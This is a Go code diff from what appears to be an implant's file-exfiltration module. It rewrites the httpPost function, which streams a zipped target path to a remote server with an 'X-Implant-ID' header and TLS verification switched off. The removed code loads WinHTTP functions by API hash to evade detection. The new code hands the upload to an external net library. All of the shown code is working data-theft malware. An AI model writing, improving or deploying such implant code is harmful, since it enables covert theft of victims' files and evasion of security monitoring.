@@ -6,9 +6,8 @@ import (
 	"io"
 	"os"
 	"path/filepath"
-	"unsafe"
 
-	wc "github.com/carved4/go-wincall"
+	"github.com/carved4/net/pkg/net"
 )
 
 func StreamZip(path string, w io.Writer) error {
@@ -114,166 +113,17 @@ func PostExfil(serverURL string, targetPath string, filename string, userAgent s
 }
 
 func httpPost(url string, bodyReader io.Reader, filename string, userAgent string, implantID string) error {
-	if len(url) < 8 {
-		return fmt.Errorf("invalid URL")
+	headers := map[string]string{
+		"Content-Type": "application/zip",
+		"X-Filename":   filename,
+		"X-Implant-ID": implantID,
 	}
 
-	var host, path string
-	var port uint16 = 443
-	var secure bool = true
-
-	if len(url) >= 8 && url[:8] == "https://" {
-		remaining := url[8:]
-		parseHostPathPort(remaining, &host, &path, &port)
-	} else if len(url) >= 7 && url[:7] == "http://" {
-		remaining := url[7:]
-		port = 80
-		parseHostPathPort(remaining, &host, &path, &port)
-		secure = false
-	} else {
-		return fmt.Errorf("invalid URL scheme")
+	cfg := &net.Config{
+		UserAgent:  userAgent,
+		SkipVerify: true,
 	}
 
-	wc.LoadLibraryLdr("winhttp.dll")
-	dllHash := wc.GetHash("winhttp.dll")
-	moduleBase := wc.GetModuleBase(dllHash)
-
-	winHttpOpen := wc.GetFunctionAddress(moduleBase, wc.GetHash("WinHttpOpen"))
-	winHttpConnect := wc.GetFunctionAddress(moduleBase, wc.GetHash("WinHttpConnect"))
-	winHttpOpenRequest := wc.GetFunctionAddress(moduleBase, wc.GetHash("WinHttpOpenRequest"))
-	winHttpSendRequest := wc.GetFunctionAddress(moduleBase, wc.GetHash("WinHttpSendRequest"))
-	winHttpWriteData := wc.GetFunctionAddress(moduleBase, wc.GetHash("WinHttpWriteData"))
-	winHttpReceiveResponse := wc.GetFunctionAddress(moduleBase, wc.GetHash("WinHttpReceiveResponse"))
-	winHttpCloseHandle := wc.GetFunctionAddress(moduleBase, wc.GetHash("WinHttpCloseHandle"))
-	winHttpAddRequestHeaders := wc.GetFunctionAddress(moduleBase, wc.GetHash("WinHttpAddRequestHeaders"))
-	winHttpSetOption := wc.GetFunctionAddress(moduleBase, wc.GetHash("WinHttpSetOption"))
-
-	userAgentPtr, _ := wc.UTF16ptr(userAgent)
-	hostPtr, _ := wc.UTF16ptr(host)
-	pathPtr, _ := wc.UTF16ptr(path)
-	methodPtr, _ := wc.UTF16ptr("POST")
-
-	hSession, _, _ := wc.CallG0(winHttpOpen, uintptr(unsafe.Pointer(userAgentPtr)), 0, 0, 0, 0)
-	if hSession == 0 {
-		return fmt.Errorf("WinHttpOpen failed")
-	}
-	defer wc.CallG0(winHttpCloseHandle, hSession)
-
-	hConnect, _, _ := wc.CallG0(winHttpConnect, hSession, uintptr(unsafe.Pointer(hostPtr)), uintptr(port), 0)
-	if hConnect == 0 {
-		return fmt.Errorf("WinHttpConnect failed")
-	}
-	defer wc.CallG0(winHttpCloseHandle, hConnect)
-
-	var flags uintptr = 0
-	if secure {
-		flags = 0x00800000
-	}
-
-	hRequest, _, _ := wc.CallG0(winHttpOpenRequest, hConnect, uintptr(unsafe.Pointer(methodPtr)), uintptr(unsafe.Pointer(pathPtr)), 0, 0, 0, flags)
-	if hRequest == 0 {
-		return fmt.Errorf("WinHttpOpenRequest failed")
-	}
-	defer wc.CallG0(winHttpCloseHandle, hRequest)
-
-	if secure {
-		var secFlags uint32 = 0x00003300
-		wc.CallG0(winHttpSetOption, hRequest, uintptr(31), uintptr(unsafe.Pointer(&secFlags)), uintptr(4))
-	}
-
-	contentType, _ := wc.UTF16ptr("Content-Type: application/zip\r\nTransfer-Encoding: chunked\r\n")
-	wc.CallG0(winHttpAddRequestHeaders, hRequest, uintptr(unsafe.Pointer(contentType)), ^uintptr(0), 0x20000000)
-
-	filenameHeader, _ := wc.UTF16ptr(fmt.Sprintf("X-Filename: %s\r\n", filename))
-	wc.CallG0(winHttpAddRequestHeaders, hRequest, uintptr(unsafe.Pointer(filenameHeader)), ^uintptr(0), 0x20000000)
-
-	implantHeader, _ := wc.UTF16ptr(fmt.Sprintf("X-Implant-ID: %s\r\n", implantID))
-	wc.CallG0(winHttpAddRequestHeaders, hRequest, uintptr(unsafe.Pointer(implantHeader)), ^uintptr(0), 0x20000000)
-
-	result, _, _ := wc.CallG0(winHttpSendRequest, hRequest, 0, 0, 0, 0, 0, 0)
-	if result == 0 {
-		return fmt.Errorf("WinHttpSendRequest failed")
-	}
-	buf := make([]byte, 8192)
-	for {
-		n, err := bodyReader.Read(buf)
-		if n > 0 {
-			header := fmt.Sprintf("%x\r\n", n)
-			headerBytes := []byte(header)
-			var written uint32
-			res, _, _ := wc.CallG0(winHttpWriteData, hRequest, uintptr(unsafe.Pointer(&headerBytes[0])), uintptr(len(headerBytes)), uintptr(unsafe.Pointer(&written)))
-			if res == 0 {
-				return fmt.Errorf("WinHttpWriteData (header) failed")
-			}
-
-			res, _, _ = wc.CallG0(winHttpWriteData, hRequest, uintptr(unsafe.Pointer(&buf[0])), uintptr(n), uintptr(unsafe.Pointer(&written)))
-			if res == 0 {
-				return fmt.Errorf("WinHttpWriteData (data) failed")
-			}
-			crlf := []byte("\r\n")
-			res, _, _ = wc.CallG0(winHttpWriteData, hRequest, uintptr(unsafe.Pointer(&crlf[0])), uintptr(2), uintptr(unsafe.Pointer(&written)))
-			if res == 0 {
-				return fmt.Errorf("WinHttpWriteData (footer) failed")
-			}
-		}
-		if err == io.EOF {
-			break
-		}
-		if err != nil {
-			return fmt.Errorf("read body failed: %w", err)
-		}
-	}
-	term := []byte("0\r\n\r\n")
-	var written uint32
-	res, _, _ := wc.CallG0(winHttpWriteData, hRequest, uintptr(unsafe.Pointer(&term[0])), uintptr(len(term)), uintptr(unsafe.Pointer(&written)))
-	if res == 0 {
-		return fmt.Errorf("WinHttpWriteData (term) failed")
-	}
-
-	result, _, _ = wc.CallG0(winHttpReceiveResponse, hRequest, 0)
-	if result == 0 {
-		return fmt.Errorf("WinHttpReceiveResponse failed")
-	}
-
-	return nil
-}
-
-func parseHostPathPort(remaining string, host, path *string, port *uint16) {
-	slashPos := -1
-	colonPos := -1
-	for i, c := range remaining {
-		if c == ':' && colonPos == -1 {
-			colonPos = i
-		}
-		if c == '/' {
-			slashPos = i
-			break
-		}
-	}
-
-	hostEnd := len(remaining)
-	if slashPos != -1 {
-		hostEnd = slashPos
-		*path = remaining[slashPos:]
-	} else {
-		*path = "/"
-	}
-
-	hostPart := remaining[:hostEnd]
-
-	if colonPos != -1 && colonPos < hostEnd {
-		*host = hostPart[:colonPos]
-		portStr := hostPart[colonPos+1:]
-		var p int
-		for _, c := range portStr {
-			if c >= '0' && c <= '9' {
-				p = p*10 + int(c-'0')
-			}
-		}
-		if p > 0 && p < 65536 {
-			*port = uint16(p)
-		}
-	} else {
-		*host = hostPart
-	}
+	_, err := net.PostChunked(url, headers, bodyReader, cfg)
+	return err
 }
